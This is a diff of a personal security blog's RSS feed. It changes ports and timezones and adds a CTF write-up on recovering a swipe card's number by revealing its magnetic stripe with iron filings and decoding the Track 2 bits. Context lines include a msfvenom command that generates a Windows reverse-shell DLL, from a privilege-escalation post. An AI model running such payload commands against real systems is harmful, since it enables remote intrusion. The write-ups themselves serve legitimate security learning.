@@ -3,13 +3,58 @@
   <channel>
     <title>Juicy Offsec</title>
     <description>Xinyue&apos;s Security Blog</description>
-    <link>http://localhost:4000</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <link>http://localhost:8000</link>
+    <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml" />
     <author>
       <name>Xinyue</name>
       <email>gtxxxy@gmail.com</email>
       <uri>https://xxxinhy.github.io/</uri>
     </author>
+    
+      <item>
+        <title>Raymond James Ctf 2024 Physical Challenge   Swipe Card</title>
+        <description>&lt;h3 id=&quot;a-few-words-first&quot;&gt;A Few Words First&lt;/h3&gt;
+
+&lt;p&gt;It was an amazing experience participating in the Raymond James CTF 2024 in Florida as a member of our JHU CTF team @Z0D1AC. The games were a blast, especially the first physical challenge that really pushed us to think outside the box. We also tackled some super interesting challenges, like Lego-building, lockpicking, and drone tasks. Thanks to everyone’s efforts, we ended up securing 2nd place!&lt;/p&gt;
+
+&lt;p&gt;Check out the news from JHU website!
+&lt;a href=&quot;https://isi.jhu.edu/2024/10/17/johns-hopkins-student-team-places-second-in-raymond-james-cybersecurity-competition/&quot;&gt;Johns Hopkins student team places second in Raymond James cybersecurity competition - JHU Information Security Institute&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;now-lets-dive-into-swipe-card-challenge&quot;&gt;Now Let’s Dive Into Swipe Card Challenge&lt;/h3&gt;
+
+&lt;p&gt;At the beginning, we were provided with a box, which had pencil, notebook, steel nail, whetstone, glow stick and some candies(?) in it, as well as a black swipe card without any printed card number on it. The flag is the card number. The easiest way to get it is through a card reader, but none of the teams have it. So be sure to carry your own card reader to your next ctf competition - just joking ;)&lt;/p&gt;
+
+&lt;p&gt;How to find number from a smooth interface? We tried several approaches, like scratching and lighting the surface. After some research, we found the information was encoded directly within the magnetic stripe itself. There is &lt;a href=&quot;https://www.abc.net.au/science/articles/2013/02/27/3699259.htm&quot;&gt;an interesting article&lt;/a&gt; about this.&lt;/p&gt;
+
+&lt;p&gt;We filed iron filings from the nail and sprinkling them over the magnetic strip. Tilted the card and gently tapped. Then collected the fillings and do it again. After several attempts, we were excited that some iron filings were stick to the magnetic strip, which formed the shape of barcode.&lt;/p&gt;
+
+&lt;p&gt;We flipped the card upside down (180 degrees). The revealed barcode looks like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/2024-10-18-Raymond-James-CTF-2024-Physical-Challenge---Swipe-Card/card.png&quot; alt=&quot;card.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;barcode-decode&quot;&gt;Barcode Decode&lt;/h3&gt;
+
+&lt;p&gt;Next task is read barcode. Since there was no available tools for us, we decided to read one by one.&lt;/p&gt;
+
+&lt;p&gt;The card number information is located in the Track2 (upper line in picture) . We read it five bit a number, the fifth bit is odd parity bit, so we only need to caculate four bits. The logic is pretty simple: if two strips has space between them, then it is 0; otherwise it’s 1.&lt;/p&gt;
+
+&lt;p&gt;For example, 10000 → 1, 11001 → 3. Then we got the first three card numbers is 133.&lt;/p&gt;
+
+&lt;p&gt;First 5 bits(11010) is a fixed value, not an actual card number, so we ignore it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/2024-10-18-Raymond-James-CTF-2024-Physical-Challenge---Swipe-Card/barcode.png&quot; alt=&quot;barcode.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The range of valid card numbers is shown by a white rectangle. After we read all bits and calculate them all, we successfully recovered card number.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/samyk/magspoof&quot;&gt;magspoof&lt;/a&gt; This tool helped me a lot in understanding barcode works in magnetic strip.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/2024-10-18-Raymond-James-CTF-2024-Physical-Challenge---Swipe-Card/range.png&quot; alt=&quot;range.png&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 18 Oct 2024 00:00:00 -0400</pubDate>
+        <link>http://localhost:8000//Raymond-James-CTF-2024-Physical-Challenge-Swipe-Card</link>
+        <link href="http://localhost:8000/Raymond-James-CTF-2024-Physical-Challenge-Swipe-Card"/>
+        <guid isPermaLink="true">http://localhost:8000/Raymond-James-CTF-2024-Physical-Challenge-Swipe-Card</guid>
+      </item>
     
       <item>
         <title>2024 Imaginary CTF Writeup</title>
@@ -231,10 +276,10 @@ print(rgb_parse(main()))&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&qu
 
 &lt;p&gt;&lt;img src=&quot;../assets/images/2024_imaginary_CTF/Crystals_burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Sat, 20 Jul 2024 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//Imaginary-CTF-Web-Writeup</link>
-        <link href="http://localhost:4000/Imaginary-CTF-Web-Writeup"/>
-        <guid isPermaLink="true">http://localhost:4000/Imaginary-CTF-Web-Writeup</guid>
+        <pubDate>Sat, 20 Jul 2024 00:00:00 -0400</pubDate>
+        <link>http://localhost:8000//Imaginary-CTF-Web-Writeup</link>
+        <link href="http://localhost:8000/Imaginary-CTF-Web-Writeup"/>
+        <guid isPermaLink="true">http://localhost:8000/Imaginary-CTF-Web-Writeup</guid>
       </item>
     
       <item>
@@ -278,10 +323,10 @@ print(rgb_parse(main()))&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&qu
 &lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;msfvenom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;windows&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_reverse_tcp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;445&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;platform&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;windows&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;phoneinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dll&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>Wed, 26 Jun 2024 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//MySQL-LPE-to-RCE-via-WerTrigger</link>
-        <link href="http://localhost:4000/MySQL-LPE-to-RCE-via-WerTrigger"/>
-        <guid isPermaLink="true">http://localhost:4000/MySQL-LPE-to-RCE-via-WerTrigger</guid>
+        <pubDate>Wed, 26 Jun 2024 00:00:00 -0400</pubDate>
+        <link>http://localhost:8000//MySQL-LPE-to-RCE-via-WerTrigger</link>
+        <link href="http://localhost:8000/MySQL-LPE-to-RCE-via-WerTrigger"/>
+        <guid isPermaLink="true">http://localhost:8000/MySQL-LPE-to-RCE-via-WerTrigger</guid>
       </item>
     
       <item>
@@ -378,10 +423,10 @@ print(rgb_parse(main()))&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&qu
 &lt;span class=&quot;nx&quot;&gt;OK&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>Sun, 23 Jun 2024 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//Redis-4.x-5.x-Unauthenticated-Exploit</link>
-        <link href="http://localhost:4000/Redis-4.x-5.x-Unauthenticated-Exploit"/>
-        <guid isPermaLink="true">http://localhost:4000/Redis-4.x-5.x-Unauthenticated-Exploit</guid>
+        <pubDate>Sun, 23 Jun 2024 00:00:00 -0400</pubDate>
+        <link>http://localhost:8000//Redis-4.x-5.x-Unauthenticated-Exploit</link>
+        <link href="http://localhost:8000/Redis-4.x-5.x-Unauthenticated-Exploit"/>
+        <guid isPermaLink="true">http://localhost:8000/Redis-4.x-5.x-Unauthenticated-Exploit</guid>
       </item>
     
       <item>
@@ -423,10 +468,10 @@ print(rgb_parse(main()))&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&qu
   &lt;p&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges&lt;/p&gt;
 &lt;/blockquote&gt;
 </description>
-        <pubDate>Sat, 15 Jun 2024 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//Abusing-Privileges-In-Active-Directory</link>
-        <link href="http://localhost:4000/Abusing-Privileges-In-Active-Directory"/>
-        <guid isPermaLink="true">http://localhost:4000/Abusing-Privileges-In-Active-Directory</guid>
+        <pubDate>Sat, 15 Jun 2024 00:00:00 -0400</pubDate>
+        <link>http://localhost:8000//Abusing-Privileges-In-Active-Directory</link>
+        <link href="http://localhost:8000/Abusing-Privileges-In-Active-Directory"/>
+        <guid isPermaLink="true">http://localhost:8000/Abusing-Privileges-In-Active-Directory</guid>
       </item>
     
   </channel>
